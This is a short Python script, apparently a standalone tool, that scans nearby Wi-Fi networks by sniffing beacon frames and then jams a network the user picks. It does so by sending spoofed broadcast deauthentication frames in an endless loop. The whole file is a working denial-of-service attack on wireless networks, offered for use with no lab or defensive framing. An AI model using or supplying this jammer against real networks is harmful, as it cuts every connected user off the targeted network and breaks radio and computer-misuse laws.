#! /usr/bin/env python3

from scapy.all import *
from threading import Thread
import time

iface = 'wlan0'
networks = dict()

def monitor_on(iface:str):
    os.system('ip l set ' + iface + ' down')
    os.system('iw dev ' + iface + ' set monitor none')
    os.system('ip l set ' + iface + ' up')
    print('Monitor mode set on ' +iface)

def callback_ap(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11].info.decode()
        if ssid not in networks:
            print(ssid)
            networks[ssid] = bssid

def change_channel(iface=iface):
    ch = 1
    while True:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 13 each 0.5s
        ch = ch % 13 + 1
        time.sleep(0.5)

def choose_from_networks(networks=networks):
    menu_items = []
    for ssid in networks:
        menu_items.append(ssid)
    for i in range(len(menu_items)):
        print('{} - {}'.format(i, menu_items[i]))

    choice = int(input('Which network would you like to jam ? \n > '))
    return networks[menu_items[choice]]


stop_thread = False
channel_changer = Thread(target=change_channel)
channel_changer.daemon = True
channel_changer.start()
monitor_on(iface)
sniff(prn=callback_ap, iface=iface, timeout=10)
stop_thread = True
channel_changer.join(timeout=1)

ap = choose_from_networks()
client = 'ff:ff:ff:ff:ff:ff'

deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
while True:
    sendp(deauth_packet, iface=iface)
